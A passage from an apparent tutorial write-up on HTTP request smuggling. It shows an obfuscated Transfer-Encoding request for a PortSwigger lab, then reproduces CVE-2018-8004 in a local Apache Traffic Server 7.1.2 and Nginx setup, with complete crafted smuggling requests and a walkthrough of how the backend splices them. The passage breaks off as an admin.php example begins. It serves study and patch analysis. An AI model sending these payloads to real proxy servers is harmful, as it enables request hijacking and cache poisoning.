a way. We can do some obfuscation of `Transfer-Encoding` in the request packet
sent so that one of the servers does not process the `Transfer-Encoding`
request header. In a sense, it is still `CL-TE` or `TE-CL`.
Lab URL：
Constructing a packet
    POST / HTTP/1.1\r\n
    Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
    Accept-Language: en-US,en;q=0.5\r\n
    Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
    Content-length: 4\r\n
    Transfer-Encoding: chunked\r\n
    Transfer-encoding: cow\r\n
    \r\n
    5c\r\n
    GPOST / HTTP/1.1\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 15\r\n
    \r\n
    x=1\r\n
    0\r\n
    \r\n
## 4\. HTTP Smuggling Attack Example——CVE-2018-8004
### 4.1 Vulnerability Overview
Apache Traffic Server (ATS) is an efficient, scalable HTTP proxy and cache
server for the Apache Software Foundation.
There are multiple HTTP smuggling and cache poisoning issues when clients
making malicious requests interact with Apache Traffic Server (ATS). This
affects versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3.
In NVD, we can find four patches for this vulnerability, so let's take a
closer look.
CVE-2018-8004 Patch list 
Note: Although the vulnerability notification describes the scope of the
vulnerability to version 7.1.3, from the version of the patch archive on
github, most of the vulnerabilities have been fixed in version 7.1.3.
### 4.2 Test Environment
#### 4.2.1 Introduction
Here, we use ATS 7.1.2 as an example to build a simple test environment.
Environmental component introduction
    Reverse proxy server
    IP: 10.211.55.22:80
    Ubuntu 16.04
    Apache Traffic Server 7.1.2
    Backend server 1-LAMP
    IP: 10.211.55.2:10085
    Apache HTTP Server 2.4.7
    PHP 5.5.9
    Backend server 2-LNMP
    IP: 10.211.55.2:10086
    Nginx 1.4.6
    PHP 5.5.9
Environmental topology
The Apache Traffic Server is typically used as a HTTP proxy and cache server.
In this test environment, I ran it in a local Ubuntu virtual machine and
configured it as a reverse proxy for the back-end server LAMP&LNMP. By
modifying the native HOST file, we resolve the domain names `ats.mengsec.com`
and `lnmp.mengsec,com` to this IP and the n configure the mapping on the ATS.
The final effect is that we access the domain name `ats.mengsec.com` through
the local proxy server to obtain the LAMP response, and access the domain name
`lnmp.mengsec.com` locally to obtain the LNMP response.
In order to view the requested data package, I placed a PHP script that
outputs the request header in both the LNMP and LAMP web directories.
LNMP:
    ';
    if (!function_exists('getallheaders')) {
        function getallheaders() {
            $headers = array();
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') {
                    $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
                }
            }
            return $headers;
        }
    }
    var_dump(getallheaders());
    $data = file_get_contents("php://input");
    print_r($data);
LAMP:
    ';
    var_dump(getallheaders());
    $data = file_get_contents("php://input");
    print_r($data);
#### 4.2.2 Construction Process
Download the source code on Github to compile and install ATS.
    https://github.com/apache/trafficserver/archive/7.1.2.tar.gz
Install dependencies & common tools.
    apt-get install -y autoconf automake libtool pkg-config libmodule-install-perl gcc libssl-dev libpcre3-dev libcap-dev libhwloc-dev libncurses5-dev libcurl4-openssl-dev flex tcl-dev net-tools vim curl wget
Then extract the source code and compile & install.
    autoreconf -if
    ./configure --prefix=/opt/ts-712
    make
    make install
After the installation is complete, configure the reverse proxy and mapping.
Edit the `records.config` configuration file and temporarily disable the ATS
cache function.
    vim /opt/ts-712/etc/trafficserver/records.config
    CONFIG proxy.config.http.cache.http INT 0 # close caching
    CONFIG proxy.config.reverse_proxy.enabled INT 1 # Enable reverse proxy
    CONFIG proxy.config.url_remap.remap_required INT 1 # Limit ATS to only access the mapped address in the map table
    CONFIG proxy.config.http.server_ports STRING 80 80:ipv6 # Listen local port 80
Edit the `remap.config` configuration file and add the rules table to be
mapped at the end.
    vim /opt/ts-712/etc/trafficserver/remap.config
    map http://lnmp.mengsec.com/ http://10.211.55.2:10086/
    map http://ats.mengsec.com/ http://10.211.55.2:10085/
After the configuration is complete, restart the server to make the
configuration take effect. We can test it.
In order to get the server's response accurately, we use the pipe character
and `nc` to establish a link with the server.
    printf 'GET / HTTP/1.1\r\n'\
    'Host:ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
We can see that we have successfully accessed the LAMP server on the back end,
and the same can be tested, the connectivity between the proxy server and the
backend LNMP server.
    printf 'GET / HTTP/1.1\r\n'\
    'Host:lnmp.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
### 4.3 Vulnerability Test
Let's take a look at the next four patches and their descriptions.
>  # 3192 Return 400 if
> there is whitespace after the field name and before the colon
> [https://github.com/apache/trafficserver/pull/3201
> ](https://github.com/apache/trafficserver/pull/3201
> "https://github.com/apache/trafficserver/pull/3201 ")# 3201 Close the
> connection when returning a 400 error response
>  # 3231 Validate Content-> Length headers for incoming requests
>  # 3251 Drain the request
> body if there is a cache hit
#### 4.3.1 First Patch
>  # 3192 Return 400 if
> there is whitespace after the field name and before the colon
See the commit introduction is to add the implementation of `RFC7230` section
`3.2.4` to ATS.
> 
In the request packet of HTTP, there must be no white space between the
request header field and the subsequent colon. If there is a blank character,
the server must return `400`. If viewed from the patch, in ATS 7.1.2 There is
no detailed implementation of the standard. When there is a field in the
request received by the ATS server with a space between the request field and
`:`, it will not be modified, nor will it return a `400` error as described in
the RFC standard. Forward it to the backend server.
When the backend server does not strictly implement the standard, it may lead
to HTTP smuggling attacks. For example, the Nginx server ignores the request
header when it receives a request for a space between the request header field
and the colon, instead of returning a `400` error.
We can construct a special HTTP request for smuggling.
    GET / HTTP/1.1
    Host: lnmp.mengsec.com
    Content-Length : 56
    GET / HTTP/1.1
    Host: lnmp.mengsec.com
    attack: 1
    foo: 
Obviously, the data portion of the request packet below is parsed into the
request header by the backend server during the transfer.
Looking at the packets in Wireshark, ATS reuses TCP connections during data
transfer with the backend Nginx server.
Just look at the request as shown:
The shaded portion is the first request and the remaining portion is the
second request.
In the request we sent, there is a specially constructed request header
`Content-Length : 56`. 56 is the length of the subsequent data.
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
At the end of the data, there is no `\r\n`.
When our request arrives at the ATS server, because the ATS server can resolve
the request header with a space between `Content-Length : 56`, it considers
the request header to be valid. As a result, subsequent data is also treated
as part of this request. In general, for an ATS server, this request is a
complete request.
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Content-Length : 56\r\n
    \r\n
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
After receiving the request, the ATS forwards the request packet to the
corresponding backend server according to the value of the Host field. Here is
the forwarding to the Nginx server.
When the Nginx server encounters a request header similar to this `Content-Length : 56`, it will consider it invalid and then ignore it, but it will not
return a 400 error. For Nginx, the received request is
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    \r\n
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
Since there is no `\r\n` at the end, this is equivalent to receiving a full
GET request and an incomplete GET request.
complete：
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    \r\n
Incomplete：
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
At this point, Nginx will send the response corresponding to the first request
packet to the ATS server, and then wait for the subsequent second request to
be transmitted before responding.
When the next request forwarded by the ATS arrives, for Nginx, it is directly
spliced to the incomplete request packet just received. It is equivalent this:
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: GET / HTTP/1.1\r\n
    Host: 10.211.55.2:10086\r\n
    X-Forwarded-For: 10.211.55.2\r\n
    Via: http/1.1 mengchen-ubuntu[3ff3687d-fa2a-4198-bc9a-0e98786adc62] (ApacheTrafficServer/7.1.2)\r\n
Then Nginx sends the response of the request packet to the ATS server. The
responses we received are the two key-value pairs `attack: 1` and `foo: GET /
HTTP/1.1`.
What harm does this cause? If the second request forwarded by ATS is not sent
by us? Let's try it out。
Suppose there is an `admin.php` under the Nginx server. The code content is as